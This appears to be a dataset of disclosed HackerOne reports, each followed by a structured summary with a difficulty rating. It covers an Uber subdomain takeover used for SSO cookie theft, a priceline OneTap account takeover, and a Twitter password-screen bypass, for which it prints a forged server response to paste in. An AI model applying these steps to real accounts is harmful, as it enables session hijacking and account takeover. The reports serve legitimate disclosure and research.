Open the victim's browser & browse to https://riders.uber.com . After being redirected to https://auth.uber.com , login with the victim's credentials so you end up on https://riders.uber.com trips dashboard again.
Open a second browser tab in the victim's browser and browse to https://saostatic.uber.com/prepareuberattack.php . Accept any certificate warnings that you may receive here - again, we're only simulating that the domain has a valid SSL certificate. Once the page has finished loading you should see a URL, "Cookie: " string and a "Set-Cookie: " strings underneath each other. This is all info gathered under the hood by the attacker's webserver that is required to login as the victim now.
Open the separate attacker's browser and setup an intercepting proxy tool to intercept requests and responses. Browse to the URL displayed on the prepareuberattack.php page output and intercept this request. Now copy the "Cookie: ..." string displayed on prepareuberattack.php and paste it into the request headers.
The response should be a redirect to https://riders.uber.com/trips, indicating successful authentication bypass. Last but not least, copy all the "Set-Cookie: " lines from the prepareuberattack.php page output and paste them in the response before forwarding it to the browser. This ensures that the stolen cookies are properly injected in the attacker's browser.
You are now logged in as the victim in the attacker's browser
In a real attack scenario, an attacker would stealthily load https://saostatic.uber.com/prepareuberattack.php in the victim's browser, e.g. through an iframe. Likewise, he/she would probably not display the URL and all the cookies on the PHP page, but store this on the server-side, ready to be abused in a stealthy fashion.
You can see all these PoC steps executed in attachment "8. Authentication Bypass PoC video.mp4", where browser 1 and browser 2 had separate upstream servers and thus even other IP addresses to prove this is a plausible threat. The code of the https://saostatic.uber.com/prepareuberattack.php and https://saostatic.uber.com/uberattack.php pages is also attached ("9. prepareuberattack.php" and "10. uberattack.php"). This was written quick & dirty for PoC purposes - I know the code is pretty hacky.
Recommendations
The recommendation for the subdomain takeover is straightforward: remove the dangling DNS CNAME pointer to Amazon CloudFront and the issue is resolved.
The recommendation for the generic Authentication Bypass issue is a bit more problematic. The fact that identities supplied to Service Providers by the Identity Provider are communicated via shared .uber.com cookies make them susceptible for all vulnerabilities that allows insight in cookies on any .uber.com subdomain. This includes remote code execution, subdomain takeover, debug logs, etc and has a very serious impact on Uber's overall security, even when the subdomain is hosted in a completely isolated environment. For example, all the mentioned out of scope .uber.com subdomains in the program's listing (bizblog.uber.com, newsroom.uber.com etc) have the inherent ability to bypass authentication of any Uber user, even though they might be remotely managed by an external party with lower security standards than Uber. Ironically enough, any service that wants to benefit from the current Uber SSO system will have to receive a .uber.com subdomain, as this is required by design. This in its turn increases the attack surface for abuse of the generic Authentication Bypass. On the short term I would recommend fixing the fact that the "_csid" cookie can remain alive in a browser once a user is already logged in (although Jack Whitton already showed that CSP could be abused to prevent a victim to make the request back to the Service Provider and invalidate the token, so I wouldn't put too much trust in that). On the mid-to-long term I would advise Uber to migrate to a real OAuth SSO system that communicates identity secrets and proofs by other means than shared cookies, e.g. GET parameters (OAuth "code" flow) or window.location.hash values (e.g. OAuth "access tokens" flow).
Let me know if anything is unclear.
Cheers,
Arne Swinnen
https://www.arneswinnen.net



================================================================================
Vulnerability Description:
This vulnerability involves a chain of two issues: a subdomain takeover of saostatic.uber.com and an authentication bypass via shared session cookies in Uber's SSO system. The subdomain takeover allows an attacker to serve malicious content, while the shared session cookie mechanism enables session hijacking, leading to full authentication bypass.

Steps to Reproduce:
1. Identify the subdomain saostatic.uber.com pointing to an unclaimed Amazon CloudFront CDN.
2. Take over the subdomain by creating a new CloudFront endpoint and linking it to an attacker-controlled server.
3. Exploit the shared session cookie mechanism on auth.uber.com to hijack a victim's session.
4. Use the stolen session cookie to bypass authentication and impersonate the victim on Uber's SSO system.
Exploitation Difficulty:
The attack requires understanding and exploiting multiple complex components: DNS misconfiguration, subdomain takeover, session cookie handling, and SSO authentication flows. The interaction between these components is subtle and non-obvious, requiring deep knowledge of web security mechanisms.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/671406: Account takeover via Google OneTap
================================================================================
RAW DESCRIPTION:

Summary:
It's possible to take over any priceline.com user's account knowing their email. The only requirement is that the victim's email domain is not registered with Google's Gsuite. The root cause of this issue is that the backend does not verify whether the email provided is a confirmed one.
Steps To Reproduce:
Create Account A (in my case badca7@wearehackerone.com) with priceline.com, without any SSO, via the "Create an account" link (aka "register with email").
Once the account has been created, add a dummy phone number to the profile. It will serve as a canary to demonstrate we accessed the same data in the next steps.
In another browser/session (eg, incognito/private mode) sign up for a trial GSuite account at https://gsuite.google.com/signup/basic/welcome . This will be Account B.
Use any email to register as you won't need to confirm that email.
When the wizard comes to the "Does your business have a domain?" confirm and enter wearehackerone.com (or any other domain that hosts the victim's email box) as in gsuite.png (F552718). You may not use the same domain name at this stage, as I claimed it for the purposes of this PoC however you can do so when my GSuite trial expires. From this comes the requirement that the victim's email domain name must not be registered with Google prior to this attack.
Once you saved the domain record with Google, stop there as there's no need to verify the domain.
At this stage the OneTap/GoogleYOLO popup will be showing on priceline.com when visited in the same browser session. It took me some time to get it to show however signing in and out of Google Account several times with the newly created GSuite credentials and then refreshing the priceline.com page helped. On another occasion a Gmail account, which I signed in in the same browser window helped too. You may need to play around with these until you see the newly created account to show in the list. popup_onetap.png (F552723)
Once you have that, just sign in (badca7@wearehackerone.com in my case). You can confirm you accessed Account A by seeing the phone number you added in step (2). In the other browser window/session with Account A you can see that now there are two accounts showing in the top right corner and the profile data is blank.
Account takeover complete. AccountA_after_takeover.png (F552724)
Notes
IP used for this PoC: ███
Impact
Attackers can take over any priceline.com account given they were able to register a specific domain with GSuite.



================================================================================
Vulnerability Description:
The vulnerability allows an attacker to take over any priceline.com user's account by exploiting Google OneTap when the victim's email domain is not registered with GSuite. The backend does not verify if the email provided is confirmed, enabling account takeover.

Steps to Reproduce:
1. Create an account on priceline.com with an email from a domain not registered with GSuite.
2. Register the victim's email domain with a trial GSuite account without verifying the domain.
3. Trigger the Google OneTap popup on priceline.com by signing in and out of the GSuite account.
4. Use the OneTap popup to sign in to the victim's account on priceline.com.
Exploitation Difficulty:
The attack involves multiple components (priceline.com account creation, GSuite registration, Google OneTap interaction) and requires manipulating complex application states (triggering the OneTap popup). The interaction between these components is subtle and non-obvious, especially the requirement for the victim's domain to be unregistered with GSuite.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/770504: Bypass Password Authentication for updating email and phone number - Security Vulnerability
================================================================================
RAW DESCRIPTION:

Summary:
[Additional requirement for authentication is an extra layer of security for a person's Twitter account. Instead of only entering the password at the time of log in, twitter further Introduces additional layer of security by prompting users to enter their password before attempting to update any crucial Information such as email ID or phone numbers.
This additional security measure from twitter provides protection to the victim's account, considering that a victim's session may have been hijacked by a hacker, however, due to this additional layer of security Implemented by twitter the hacker would not be able to change the victim's personal details such as phone number or email id, as they will be prompted to enter the victim's account password In order to make these changes, which will not be known to a hacker (In case of a session hijack)
This report is to bring to your attention a security vulnerability that will allow hackers that have hijacked a user's session to bypass the password screen (Without knowing the user's password) that is prompted to a user before trying to update the email ID and phone number under Settings and Privacy -> Accounts.]
Description:
[For users that have had their twitter session hijacked, this security vulnerability would enable a hacker to completely take over a victim's account as they will be able to change the victim's e-mail ID and phone number by bypassing the password screen prompted during the verification process.
This will allow the hacker to reset the password either by requesting for a link and/or code on the email/mobile updated by them against the victim's account, therefore resulting in a complete account take over.
The security vulnerability is basically related to client side processing that is undertaken based on the response received from the server.
For example : Let's say the hacker enters the password and clicks on 'Next' there is a flow token that is generated by the client which is sent to the server. The server would then validate the password and return a response to the client to Indicate whether the next page must be loaded or If there was an error related to the request i.e. 'Wrong password'.
The security vulnerability allows for the client request and server response to be Intercepted and manipulated such that even though the hacker may have entered an Incorrect password, the server response can be Intercepted modified to a valid JSON response with the token flow number that was originally sent by the client to the server, therefore leading for twitter to believe that the authentication was successful and bypassing the password screen, thereby providing access to hackers to update the victims' email ID and phone number without the need for additional authentication.
]
Steps To Reproduce:
(Add details for how we can reproduce the issue)
With the assumption that the victim's twitter session is 'hijacked' and in a 'logged in' state for the hacker. The below steps must be followed In order to reproduce the security vulnerability.
Security Vulnerability #1 - Update Victim's E-mail ID - Bypass password screen
Go to Settings and Privacy -> Accounts
Click on Email -> Update email address
Enter any random password and Click on 'Next'
Intercept the request the above request
Copy the flow token up to :
Forward client request to server and Intercept the response from server to this request
Modify the Intercepted Server's Response with the below text please paste the flow token from step 5 below and remove the [square brackets]
Forward the modified 'Server Response' to the client
This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your email ID and verify It In order to add the email ID to the victim's account
-------------------------------------------COPY FROM BELOW START------------------------------------------------
HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 2732
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:12:15 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:12:15 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: 1d41600d4a1940ad3cab723b3ec0b57a
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 308
x-tsa-request-body-time: 1
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0
{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EmailAssocEnterEmail","enter_email":{"primary_text":{"text":"Change email","entities":[]},"secondary_text":{"text":"Your current email is ███. What would you like to update it to? Your email is not displayed in your public profile on Twitter.","entities":[]},"hint_text":"Email address","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"EmailAssocVerifyEmail"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your email address find and connect with you on Twitter. Learn more","entities":[{"from_index":77,"to_index":87,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"email_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}}}},{"subtask_id":"EmailAssocVerifyEmail","email_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify your email.\t","entities":[]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_email_verification_link","subtask_id":"DidNotReceiveEmailDialog"}}]},"hint_text":"Verification code","email":{"subtask_data_reference":{"key":"email","subtask_id":"EmailAssocEnterEmail"}},"name":{"subtask_data_reference":{"key":"name","subtask_id":"EmailAssocEnterEmail"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EmailAssocEnterEmail"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EmailAssocEnterEmail"},"verification_status_polling_enabled":false}},{"subtask_id":"DidNotReceiveEmailDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"email_link","label":"Resend","subtask_navigation_context":{"action":"resend_email"},"subtask_id":"EmailAssocVerifyEmail"}],"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_navigation_context":{"action":"cancel_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_email_dialog"},"subtask_id":"EmailAssocVerifyEmail"}}}]}
-------------------------------------------COPY END------------------------------------------------

Security Vulnerability #2 - Update Victim's phone number - Bypass password screen
Go to Settings and Privacy -> Accounts
Click on Phone -> Add/Update phone number
Enter any random password and Click on 'Next'
Intercept the request the above request
Copy the flow token up to :
Forward client request to server and Intercept the response from server to this request
Modify the Intercepted Server's Response with the below text please paste the flow token from step 5 below and remove the [square brackets]
Forward the modified 'Server Response' to the client
This will now bypass the password screen irrespective of It being a correct or Incorrect password - You must now 'Enter' your mobile number and verify It In order to add the phone number to the victim's account
-------------------------------------------COPY FROM BELOW START------------------------------------------------
HTTP/1.1 200 OK
access-control-allow-credentials: true
access-control-allow-origin: https://twitter.com
cache-control: no-cache, no-store, must-revalidate, pre-check=0, post-check=0
connection: close
content-disposition: attachment; filename=json.json
Content-Length: 16612
content-type: application/json; charset=utf-8
date: Mon, 06 Jan 2020 21:36:13 GMT
expires: Tue, 31 Mar 1981 05:00:00 GMT
last-modified: Mon, 06 Jan 2020 21:36:13 GMT
pragma: no-cache
server: tsa_k
strict-transport-security: max-age=631138519
x-connection-hash: be41fa15964cca748cd82c001728c777
x-content-type-options: nosniff
x-frame-options: SAMEORIGIN
x-response-time: 305
x-tsa-request-body-time: 0
x-twitter-response-tags: BouncerCompliant
x-xss-protection: 0
{"flow_token":"[PASTE FLOW TOKEN HERE]:1","status":"success","subtasks":[{"subtask_id":"EnterPhoneForAssociation","enter_phone":{"primary_text":{"text":"Add a phone number","entities":[]},"secondary_text":{"text":"Enter the phone number youâd like to associate with your Twitter account. Youâll get a verification code sent here.","entities":[]},"hint_text":"Your phone number","next_link":{"link_type":"subtask","link_id":"next_link","label":"Next","subtask_id":"PhoneAssociationVerificationAlert"},"skip_link":{"link_type":"abort","link_id":"cancel_link","label":"Cancel"},"discoverability_setting":{"primary_text":{"text":"Let people who have your phone number find and connect with you on Twitter. Learn more","entities":[{"from_index":76,"to_index":86,"navigation_link":{"link_type":"web_link","link_id":"open_web_link","label":"learn_more_email_phone_disco_link","url":"https://help.twitter.com/safety-and-security/email-and-phone-discoverability-settings"}}]},"value_type":"boolean","value_identifier":"phone_discoverability_setting","value_data":{"boolean_data":{"initial_value":false}}},"country_codes":[{"id":"AF","text":{"text":"+93 Afghanistan","entities":[]}},{"id":"AL","text":{"text":"+355 Albania","entities":[]}},{"id":"DZ","text":{"text":"+213 Algeria","entities":[]}},{"id":"AS","text":{"text":"+1 American Samoa","entities":[]}},{"id":"AD","text":{"text":"+376 Andorra","entities":[]}},{"id":"AO","text":{"text":"+244 Angola","entities":[]}},{"id":"AI","text":{"text":"+1 Anguilla","entities":[]}},{"id":"AG","text":{"text":"+1 Antigua and Barbuda","entities":[]}},{"id":"AR","text":{"text":"+54 Argentina","entities":[]}},{"id":"AM","text":{"text":"+374 Armenia","entities":[]}},{"id":"AW","text":{"text":"+297 Aruba","entities":[]}},{"id":"AU","text":{"text":"+61 Australia","entities":[]}},{"id":"AT","text":{"text":"+43 Austria","entities":[]}},{"id":"AZ","text":{"text":"+994 Azerbaijan","entities":[]}},{"id":"BS","text":{"text":"+1 Bahamas","entities":[]}},{"id":"BH","text":{"text":"+973 Bahrain","entities":[]}},{"id":"BD","text":{"text":"+880 Bangladesh","entities":[]}},{"id":"BB","text":{"text":"+1 Barbados","entities":[]}},{"id":"BY","text":{"text":"+375 Belarus","entities":[]}},{"id":"BE","text":{"text":"+32 Belgium","entities":[]}},{"id":"BZ","text":{"text":"+501 Belize","entities":[]}},{"id":"BJ","text":{"text":"+229 Benin","entities":[]}},{"id":"BM","text":{"text":"+1 Bermuda","entities":[]}},{"id":"BT","text":{"text":"+975 Bhutan","entities":[]}},{"id":"BO","text":{"text":"+591 Bolivia","entities":[]}},{"id":"BQ","text":{"text":"+599 Bonaire, Sint Eustatius and Saba","entities":[]}},{"id":"BA","text":{"text":"+387 Bosnia and Herzegovina","entities":[]}},{"id":"BW","text":{"text":"+267 Botswana","entities":[]}},{"id":"BR","text":{"text":"+55 Brazil","entities":[]}},{"id":"VG","text":{"text":"+1 British Virgin Islands","entities":[]}},{"id":"BN","text":{"text":"+673 Brunei","entities":[]}},{"id":"BG","text":{"text":"+359 Bulgaria","entities":[]}},{"id":"BF","text":{"text":"+226 Burkina Faso","entities":[]}},{"id":"BI","text":{"text":"+257 Burundi","entities":[]}},{"id":"KH","text":{"text":"+855 Cambodia","entities":[]}},{"id":"CM","text":{"text":"+237 Cameroon","entities":[]}},{"id":"CA","text":{"text":"+1 Canada","entities":[]}},{"id":"CV","text":{"text":"+238 Cape Verde","entities":[]}},{"id":"KY","text":{"text":"+1 Cayman Islands","entities":[]}},{"id":"CF","text":{"text":"+236 Central African Republic","entities":[]}},{"id":"TD","text":{"text":"+235 Chad","entities":[]}},{"id":"CL","text":{"text":"+56 Chile","entities":[]}},{"id":"CN","text":{"text":"+86 China","entities":[]}},{"id":"CO","text":{"text":"+57 Colombia","entities":[]}},{"id":"KM","text":{"text":"+269 Comoros","entities":[]}},{"id":"CG","text":{"text":"+242 Congo","entities":[]}},{"id":"CK","text":{"text":"+682 Cook Islands","entities":[]}},{"id":"CR","text":{"text":"+506 Costa Rica","entities":[]}},{"id":"HR","text":{"text":"+385 Croatia","entities":[]}},{"id":"CU","text":{"text":"+53 Cuba","entities":[]}},{"id":"CW","text":{"text":"+599 CuraÃ§ao","entities":[]}},{"id":"CY","text":{"text":"+357 Cyprus","entities":[]}},{"id":"CZ","text":{"text":"+420 Czech Republic","entities":[]}},{"id":"CI","text":{"text":"+225 CÃ´te d'Ivoire","entities":[]}},{"id":"DK","text":{"text":"+45 Denmark","entities":[]}},{"id":"DJ","text":{"text":"+253 Djibouti","entities":[]}},{"id":"DM","text":{"text":"+1 Dominica","entities":[]}},{"id":"DO","text":{"text":"+1 Dominican Republic","entities":[]}},{"id":"EC","text":{"text":"+593 Ecuador","entities":[]}},{"id":"EG","text":{"text":"+20 Egypt","entities":[]}},{"id":"SV","text":{"text":"+503 El Salvador","entities":[]}},{"id":"GQ","text":{"text":"+240 Equatorial Guinea","entities":[]}},{"id":"ER","text":{"text":"+291 Eritrea","entities":[]}},{"id":"EE","text":{"text":"+372 Estonia","entities":[]}},{"id":"ET","text":{"text":"+251 Ethiopia","entities":[]}},{"id":"FK","text":{"text":"+500 Falkland Islands","entities":[]}},{"id":"FO","text":{"text":"+298 Faroe Islands","entities":[]}},{"id":"FJ","text":{"text":"+679 Fiji","entities":[]}},{"id":"FI","text":{"text":"+358 Finland","entities":[]}},{"id":"FR","text":{"text":"+33 France","entities":[]}},{"id":"GF","text":{"text":"+594 French Guiana","entities":[]}},{"id":"PF","text":{"text":"+689 French Polynesia","entities":[]}},{"id":"GA","text":{"text":"+241 Gabon","entities":[]}},{"id":"GM","text":{"text":"+220 Gambia","entities":[]}},{"id":"GE","text":{"text":"+995 Georgia","entities":[]}},{"id":"DE","text":{"text":"+49 Germany","entities":[]}},{"id":"GH","text":{"text":"+233 Ghana","entities":[]}},{"id":"GI","text":{"text":"+350 Gibraltar","entities":[]}},{"id":"GR","text":{"text":"+30 Greece","entities":[]}},{"id":"GL","text":{"text":"+299 Greenland","entities":[]}},{"id":"GD","text":{"text":"+1 Grenada","entities":[]}},{"id":"GP","text":{"text":"+590 Guadeloupe","entities":[]}},{"id":"GU","text":{"text":"+1 Guam","entities":[]}},{"id":"GT","text":{"text":"+502 Guatemala","entities":[]}},{"id":"GN","text":{"text":"+224 Guinea","entities":[]}},{"id":"GW","text":{"text":"+245 Guinea-Bissau","entities":[]}},{"id":"GY","text":{"text":"+592 Guyana","entities":[]}},{"id":"HT","text":{"text":"+509 Haiti","entities":[]}},{"id":"HN","text":{"text":"+504 Honduras","entities":[]}},{"id":"HK","text":{"text":"+852 Hong Kong","entities":[]}},{"id":"HU","text":{"text":"+36 Hungary","entities":[]}},{"id":"IS","text":{"text":"+354 Iceland","entities":[]}},{"id":"IN","text":{"text":"+91 India","entities":[]}},{"id":"ID","text":{"text":"+62 Indonesia","entities":[]}},{"id":"IR","text":{"text":"+98 Iran","entities":[]}},{"id":"IQ","text":{"text":"+964 Iraq","entities":[]}},{"id":"IE","text":{"text":"+353 Ireland","entities":[]}},{"id":"IM","text":{"text":"+44 Isle Of Man","entities":[]}},{"id":"IL","text":{"text":"+972 Israel","entities":[]}},{"id":"IT","text":{"text":"+39 Italy","entities":[]}},{"id":"JM","text":{"text":"+1 Jamaica","entities":[]}},{"id":"JP","text":{"text":"+81 Japan","entities":[]}},{"id":"JE","text":{"text":"+44 Jersey","entities":[]}},{"id":"JO","text":{"text":"+962 Jordan","entities":[]}},{"id":"KZ","text":{"text":"+7 Kazakhstan","entities":[]}},{"id":"KE","text":{"text":"+254 Kenya","entities":[]}},{"id":"KI","text":{"text":"+686 Kiribati","entities":[]}},{"id":"KW","text":{"text":"+965 Kuwait","entities":[]}},{"id":"KG","text":{"text":"+996 Kyrgyzstan","entities":[]}},{"id":"LA","text":{"text":"+856 Laos","entities":[]}},{"id":"LV","text":{"text":"+371 Latvia","entities":[]}},{"id":"LB","text":{"text":"+961 Lebanon","entities":[]}},{"id":"LS","text":{"text":"+266 Lesotho","entities":[]}},{"id":"LR","text":{"text":"+231 Liberia","entities":[]}},{"id":"LY","text":{"text":"+218 Libya","entities":[]}},{"id":"LI","text":{"text":"+423 Liechtenstein","entities":[]}},{"id":"LT","text":{"text":"+370 Lithuania","entities":[]}},{"id":"LU","text":{"text":"+352 Luxembourg","entities":[]}},{"id":"MO","text":{"text":"+853 Macao","entities":[]}},{"id":"MK","text":{"text":"+389 Macedonia","entities":[]}},{"id":"MG","text":{"text":"+261 Madagascar","entities":[]}},{"id":"MW","text":{"text":"+265 Malawi","entities":[]}},{"id":"MY","text":{"text":"+60 Malaysia","entities":[]}},{"id":"MV","text":{"text":"+960 Maldives","entities":[]}},{"id":"ML","text":{"text":"+223 Mali","entities":[]}},{"id":"MT","text":{"text":"+356 Malta","entities":[]}},{"id":"MQ","text":{"text":"+596 Martinique","entities":[]}},{"id":"MR","text":{"text":"+222 Mauritania","entities":[]}},{"id":"MU","text":{"text":"+230 Mauritius","entities":[]}},{"id":"YT","text":{"text":"+262 Mayotte","entities":[]}},{"id":"MX","text":{"text":"+52 Mexico","entities":[]}},{"id":"FM","text":{"text":"+691 Micronesia","entities":[]}},{"id":"MD","text":{"text":"+373 Moldova","entities":[]}},{"id":"MC","text":{"text":"+377 Monaco","entities":[]}},{"id":"MN","text":{"text":"+976 Mongolia","entities":[]}},{"id":"ME","text":{"text":"+382 Montenegro","entities":[]}},{"id":"MS","text":{"text":"+1 Montserrat","entities":[]}},{"id":"MA","text":{"text":"+212 Morocco","entities":[]}},{"id":"MZ","text":{"text":"+258 Mozambique","entities":[]}},{"id":"MM","text":{"text":"+95 Myanmar","entities":[]}},{"id":"NA","text":{"text":"+264 Namibia","entities":[]}},{"id":"NR","text":{"text":"+674 Nauru","entities":[]}},{"id":"NP","text":{"text":"+977 Nepal","entities":[]}},{"id":"NL","text":{"text":"+31 Netherlands","entities":[]}},{"id":"NC","text":{"text":"+687 New Caledonia","entities":[]}},{"id":"NZ","text":{"text":"+64 New Zealand","entities":[]}},{"id":"NI","text":{"text":"+505 Nicaragua","entities":[]}},{"id":"NE","text":{"text":"+227 Niger","entities":[]}},{"id":"NG","text":{"text":"+234 Nigeria","entities":[]}},{"id":"NF","text":{"text":"+672 Norfolk Island","entities":[]}},{"id":"MP","text":{"text":"+1 Northern Mariana Islands","entities":[]}},{"id":"NO","text":{"text":"+47 Norway","entities":[]}},{"id":"OM","text":{"text":"+968 Oman","entities":[]}},{"id":"PK","text":{"text":"+92 Pakistan","entities":[]}},{"id":"PS","text":{"text":"+970 Palestine","entities":[]}},{"id":"PA","text":{"text":"+507 Panama","entities":[]}},{"id":"PG","text":{"text":"+675 Papua New Guinea","entities":[]}},{"id":"PY","text":{"text":"+595 Paraguay","entities":[]}},{"id":"PE","text":{"text":"+51 Peru","entities":[]}},{"id":"PH","text":{"text":"+63 Philippines","entities":[]}},{"id":"PL","text":{"text":"+48 Poland","entities":[]}},{"id":"PT","text":{"text":"+351 Portugal","entities":[]}},{"id":"PR","text":{"text":"+1 Puerto Rico","entities":[]}},{"id":"QA","text":{"text":"+974 Qatar","entities":[]}},{"id":"RE","text":{"text":"+262 Reunion","entities":[]}},{"id":"RO","text":{"text":"+40 Romania","entities":[]}},{"id":"RU","text":{"text":"+7 Russia","entities":[]}},{"id":"RW","text":{"text":"+250 Rwanda","entities":[]}},{"id":"KN","text":{"text":"+1 Saint Kitts And Nevis","entities":[]}},{"id":"LC","text":{"text":"+1 Saint Lucia","entities":[]}},{"id":"MF","text":{"text":"+590 Saint Martin","entities":[]}},{"id":"VC","text":{"text":"+1 Saint Vincent And The Grenadines","entities":[]}},{"id":"WS","text":{"text":"+685 Samoa","entities":[]}},{"id":"SM","text":{"text":"+378 San Marino","entities":[]}},{"id":"ST","text":{"text":"+239 Sao Tome And Principe","entities":[]}},{"id":"SA","text":{"text":"+966 Saudi Arabia","entities":[]}},{"id":"SN","text":{"text":"+221 Senegal","entities":[]}},{"id":"RS","text":{"text":"+381 Serbia","entities":[]}},{"id":"SC","text":{"text":"+248 Seychelles","entities":[]}},{"id":"SL","text":{"text":"+232 Sierra Leone","entities":[]}},{"id":"SG","text":{"text":"+65 Singapore","entities":[]}},{"id":"SX","text":{"text":"+1 Sint Maarten (Dutch part)","entities":[]}},{"id":"SK","text":{"text":"+421 Slovakia","entities":[]}},{"id":"SI","text":{"text":"+386 Slovenia","entities":[]}},{"id":"SB","text":{"text":"+677 Solomon Islands","entities":[]}},{"id":"SO","text":{"text":"+252 Somalia","entities":[]}},{"id":"ZA","text":{"text":"+27 South Africa","entities":[]}},{"id":"KR","text":{"text":"+82 South Korea","entities":[]}},{"id":"SS","text":{"text":"+211 South Sudan","entities":[]}},{"id":"ES","text":{"text":"+34 Spain","entities":[]}},{"id":"LK","text":{"text":"+94 Sri Lanka","entities":[]}},{"id":"SR","text":{"text":"+597 Suriname","entities":[]}},{"id":"SZ","text":{"text":"+268 Swaziland","entities":[]}},{"id":"SE","text":{"text":"+46 Sweden","entities":[]}},{"id":"CH","text":{"text":"+41 Switzerland","entities":[]}},{"id":"TW","text":{"text":"+886 Taiwan","entities":[]}},{"id":"TJ","text":{"text":"+992 Tajikistan","entities":[]}},{"id":"TZ","text":{"text":"+255 Tanzania","entities":[]}},{"id":"TH","text":{"text":"+66 Thailand","entities":[]}},{"id":"CD","text":{"text":"+243 The Democratic Republic Of Congo","entities":[]}},{"id":"TL","text":{"text":"+670 Timor-Leste","entities":[]}},{"id":"TG","text":{"text":"+228 Togo","entities":[]}},{"id":"TO","text":{"text":"+676 Tonga","entities":[]}},{"id":"TT","text":{"text":"+1 Trinidad and Tobago","entities":[]}},{"id":"TN","text":{"text":"+216 Tunisia","entities":[]}},{"id":"TR","text":{"text":"+90 Turkey","entities":[]}},{"id":"TM","text":{"text":"+993 Turkmenistan","entities":[]}},{"id":"TC","text":{"text":"+1 Turks And Caicos Islands","entities":[]}},{"id":"TV","text":{"text":"+688 Tuvalu","entities":[]}},{"id":"VI","text":{"text":"+1 U.S. Virgin Islands","entities":[]}},{"id":"UG","text":{"text":"+256 Uganda","entities":[]}},{"id":"UA","text":{"text":"+380 Ukraine","entities":[]}},{"id":"AE","text":{"text":"+971 United Arab Emirates","entities":[]}},{"id":"GB","text":{"text":"+44 United Kingdom","entities":[]}},{"id":"US","text":{"text":"+1 United States","entities":[]}},{"id":"UY","text":{"text":"+598 Uruguay","entities":[]}},{"id":"UZ","text":{"text":"+998 Uzbekistan","entities":[]}},{"id":"VU","text":{"text":"+678 Vanuatu","entities":[]}},{"id":"VE","text":{"text":"+58 Venezuela","entities":[]}},{"id":"VN","text":{"text":"+84 Vietnam","entities":[]}},{"id":"XK","text":{"text":"+383 XK","entities":[]}},{"id":"YE","text":{"text":"+967 Yemen","entities":[]}},{"id":"ZM","text":{"text":"+260 Zambia","entities":[]}},{"id":"ZW","text":{"text":"+263 Zimbabwe","entities":[]}}],"default_country_code":"IN"}},{"subtask_id":"PhoneAssociationVerificationAlert","alert_dialog":{"next_link":{"link_type":"subtask","link_id":"next_link","label":"OK","subtask_id":"PhoneAssociationVerification"},"primary_text":{"text":"Verify phone","entities":[]},"secondary_text":{"text":"We'll send your verification code to . Standard SMS, call and data fees may apply.","entities":[{"from_index":37,"to_index":37,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Edit","subtask_id":"EnterPhoneForAssociation"}}},{"subtask_id":"PhoneAssociationVerification","phone_verification":{"primary_text":{"text":"We sent you a code","entities":[]},"secondary_text":{"text":"Enter it below to verify .","entities":[{"from_index":25,"to_index":25,"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}}]},"detail_text":{"text":"Didn't receive code?","entities":[{"from_index":0,"to_index":20,"navigation_link":{"link_type":"subtask","link_id":"resend_phone_verification_link","subtask_id":"DidNotReceiveSMSDialog"}}]},"hint_text":"Verification code","phone_number":{"subtask_data_reference":{"key":"phone_number","subtask_id":"EnterPhoneForAssociation"}},"next_link":{"link_type":"task","link_id":"next_link","label":"Verify"},"fail_link":{"link_type":"subtask","link_id":"fail_link","subtask_id":"EnterPhoneForAssociation"},"cancel_link":{"link_type":"subtask","link_id":"cancel_link","label":"Cancel","subtask_id":"EnterPhoneForAssociation"},"auto_verify_hint_text":"Waiting for SMS to arrive...","send_via_voice":false,"phone_country_code":{"subtask_data_reference":{"key":"country_code","subtask_id":"EnterPhoneForAssociation"}}}},{"subtask_id":"DidNotReceiveSMSDialog","menu_dialog":{"primary_text":{"text":"Didnât receive the code?","entities":[]},"primary_action_links":[{"link_type":"subtask","link_id":"sms_link","label":"Resend","subtask_navigation_context":{"action":"resend_sms"},"subtask_id":"PhoneAssociationVerification"}],"cancel_link":{"link_type":"task","link_id":"skip_link","label":"Cancel"},"dismiss_link":{"link_type":"subtask","link_id":"dismiss_link","subtask_navigation_context":{"action":"dismiss_phone_dialog"},"subtask_id":"PhoneAssociationVerification"}}}]}
-------------------------------------------COPY END------------------------------------------------
Impact:
